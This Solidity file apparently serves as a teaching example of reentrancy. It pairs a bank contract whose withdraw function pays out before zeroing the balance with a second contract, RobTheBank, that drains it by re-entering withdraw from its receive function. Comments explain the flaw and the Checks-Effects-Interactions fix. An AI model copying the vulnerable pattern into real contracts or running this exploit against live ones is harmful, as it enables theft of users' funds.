// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity 0.8.28;

import {Address} from "@openzeppelin/contracts/utils/Address.sol";

contract BadBank {
    using Address for address;
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw() public {
        // This function is vulnerable to reentrancy attacks
        // Should follow the "Checks-Effects-Interactions" pattern:
        // 1. First update the balance: balances[msg.sender] = 0;
        // 2. Then send ETH: Address.sendValue(payable(msg.sender), balance);
        // This prevents recursive withdrawals during the ETH transfer
        uint256 balance = balances[msg.sender];
        Address.sendValue(payable(msg.sender), balance);
        balances[msg.sender] = 0;
    }
}

contract RobTheBank {
    BadBank public bank;

    constructor(address _bank) {
        bank = BadBank(_bank);
    }
    
    function rob() public payable {
        // Step 1: Deposit some ETH to establish a balance
        bank.deposit{value: msg.value}();
        
        // Step 2: Initiate the first withdrawal
        bank.withdraw();
    }

    receive() external payable {
        // Step 3: When we receive ETH, immediately withdraw again
        // This works because our balance is still not set to 0
        if (address(bank).balance > 0) {
            bank.withdraw();
        }
    }
}
